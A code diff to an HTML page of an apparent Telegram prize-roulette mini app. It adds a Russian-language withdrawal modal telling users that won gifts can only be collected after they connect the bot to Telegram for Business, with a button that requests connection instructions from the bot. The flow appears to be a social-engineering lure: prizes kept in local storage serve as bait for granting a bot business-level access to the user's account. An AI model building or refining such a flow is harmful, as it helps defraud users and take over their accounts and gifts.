@@ -55,6 +55,24 @@
     </div>
   </div>
 
+  <!-- Новое модальное окно для вывода подарка -->
+  <div id="withdraw-info-modal-overlay" class="modal-overlay">
+    <div class="modal-content">
+      <div class="modal-header">
+        <span class="modal-icon">💼</span>
+        <h1>Вывод подарка</h1>
+      </div>
+      <img id="withdraw-info-img" src="" alt="Подарок для вывода">
+      <h2 id="withdraw-info-title"></h2>
+      <div class="info-box">
+        <p><strong>Для вывода подарка необходимо:</strong></p>
+        <p>Подключить бота к Telegram для бизнеса. Это позволит автоматически передавать выигранные подарки прямо в ваш аккаунт.</p>
+      </div>
+      <p class="info-footer">Инструкция подключения, находится во вкладке "информация".</p>
+      <button id="withdraw-info-btn">Понятно</button>
+    </div>
+  </div>
+
   <script src="prizes.js"></script>
   <script src="roulette.js"></script>
   <script>
@@ -93,12 +111,12 @@
     document.addEventListener('DOMContentLoaded', generatePrizeList);
 
     // Пример подарка для отображения (замени на динамические данные при необходимости)
-    function renderGiftCard(gift) {
+    function renderGiftCard(gift, index) {
       return `<li><div class="gift-card">
         <img src="${gift.img}" alt="${gift.name}">
         <div class="gift-card-title">${gift.name}</div>
         <div class="gift-card-date">Выигран: ${gift.date}</div>
-        <button class="gift-card-btn" onclick="window.Telegram && Telegram.WebApp ? Telegram.WebApp.close() : alert('Откройте через Telegram')">Нажмите для вывода</button>
+        <button class="gift-card-btn" data-gift-index="${index}">Нажмите для вывода</button>
       </div></li>`;
     }
     function getGiftsFromStorage() {
@@ -107,11 +125,41 @@
     function updateGiftsList() {
       const gifts = getGiftsFromStorage();
       document.getElementById('my-gifts-list').innerHTML = gifts.length
-        ? gifts.map(renderGiftCard).join('')
+        ? gifts.map((gift, index) => renderGiftCard(gift, index)).join('')
         : '<div style="color:#888;margin-top:30px;">Подарков пока нет</div>';
     }
     // Показываем пример при открытии вкладки "Мои подарки"
     document.querySelector('[data-tab="gifts"]').addEventListener('click', updateGiftsList);
+
+    // Логика для модального окна вывода
+    const withdrawModalOverlay = document.getElementById('withdraw-info-modal-overlay');
+    const withdrawModalImg = document.getElementById('withdraw-info-img');
+    const withdrawModalTitle = document.getElementById('withdraw-info-title');
+    const withdrawModalBtn = document.getElementById('withdraw-info-btn');
+
+    function showWithdrawModal(gift) {
+      withdrawModalImg.src = gift.img;
+      withdrawModalTitle.textContent = gift.name;
+      withdrawModalOverlay.classList.add('visible');
+    }
+    
+    document.getElementById('my-gifts-list').addEventListener('click', (e) => {
+      if (e.target && e.target.classList.contains('gift-card-btn')) {
+        const giftIndex = e.target.dataset.giftIndex;
+        const gift = getGiftsFromStorage()[giftIndex];
+        if (gift) {
+          showWithdrawModal(gift);
+        }
+      }
+    });
+
+    withdrawModalBtn.addEventListener('click', () => {
+      withdrawModalOverlay.classList.remove('visible');
+      if (window.Telegram && Telegram.WebApp) {
+        Telegram.WebApp.sendData(JSON.stringify({action: "show_connection_instructions"}));
+        Telegram.WebApp.close();
+      }
+    });
   </script>
 </body>
 </html>
